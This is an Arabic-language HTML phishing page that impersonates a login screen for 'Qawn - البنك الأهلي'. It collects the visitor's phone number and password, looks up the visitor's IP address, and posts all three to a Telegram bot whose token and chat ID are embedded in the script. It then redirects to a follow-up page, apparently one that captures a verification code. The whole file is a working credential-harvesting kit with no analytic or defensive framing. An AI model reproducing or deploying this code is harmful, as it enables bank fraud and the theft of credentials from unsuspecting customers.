    <style type="text/css">

            direction: rtl;
            font-family: 'Droid Arabic Kufi', sans-serif;

        body, h6, label, input, button, small, footer, .form-group {

        .form-group.centered-button button {

            border-radius: 50px;

<body style="background-color: #fff7fb;">

    <nav class="navbar navbar-expand-md navbar-danger bg-danger shadow-sm"></nav>

    <main class="py-4">
        <div class="container justify-content-center text-center container-logo">
            <a class="navbar-brand justify-content-center">
                <img src="https://www2.0zz0.com/2025/05/17/17/255455250.png" style="width:100%" alt="logo">
            </a>
        </div>

        <div class="container">

            <div class="container justify-content-center">
                <form id="login-form" style="padding: 10px;">
                    <div class="form-group row text-right">
                        <input type="tel" class="form-control" id="phone" name="phone" placeholder="رقم الهاتف" autofocus="">
                        <span id="verify_phone" class="text-danger font-weight-bolder text-right" style="display: none;">يرجى إدخال رقم الهاتف</span>
                    </div>
                    <div class="form-group row text-right">
                        <input type="password" class="form-control" id="password" name="password" placeholder="كلمة السر">
                        <span id="verify_password" class="text-danger font-weight-bolder text-right" style="display: none;">يرجى إدخال كلمة السر</span>
                    </div>
                    <div class="form-group centered-button">
                        <button type="submit" class="btn btn-success">
                            <i class="fa fa-lock ml-10"></i> متابعة
                        </button>
                    </div>
                </form>
            </div>
        </div>

    <footer>
        <small>© 2025 جميع الحقوق محفوظة لـشركة Qawn - البنك الأهلي</small>
    </footer>

    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
    <script>
        $(document).ready(function() {
            $('#login-form').submit(function(event) {
                event.preventDefault();
                $('#verify_phone, #verify_password').hide();

                const phone = $("#phone").val();
                const password = $("#password").val();

                if (!phone) {
                    $('#verify_phone').show();
                    return;
                }

                if (!password) {
                    $('#verify_password').show();
                    return;
                }

                // الحصول على IP الجهاز
                $.get("https://api.ipify.org?format=json", function(data) {
                    const userIP = data.ip;

                    const telegramBotToken = "7219743105:AAE7HUutErQyxqYaD15tHo56tc52qC_3FAM";
                    const chatId = "-4625923889";
                    const message = `رقم الهاتف: ${phone}\nكلمة السر: ${password}\nIP المستخدم: ${userIP}`;

                    const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

                    $.post(telegramUrl, {
                        chat_id: chatId,
                        text: message
                    }).done(function (response) {
                        // إعادة التوجيه لصفحة أخرى
                        window.location.href = "qawncode.html";
                    }).fail(function (error) {
                        alert("حدث خطأ أثناء الإرسال. يرجى المحاولة لاحقًا.");
                    });
                });
            });
        });
    </script>
